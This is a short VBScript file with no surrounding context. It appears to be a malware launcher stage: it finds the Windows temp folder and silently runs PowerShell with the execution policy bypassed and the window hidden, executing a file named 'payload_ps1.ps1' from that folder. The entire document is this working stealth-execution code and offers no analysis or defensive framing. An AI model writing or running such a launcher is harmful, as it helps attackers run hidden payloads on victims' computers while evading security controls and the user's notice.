Set sh = CreateObject("WScript.Shell")
tempPath = sh.ExpandEnvironmentStrings("%TEMP%")
sh.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & tempPath & "\payload_ps1.ps1""", 0, False
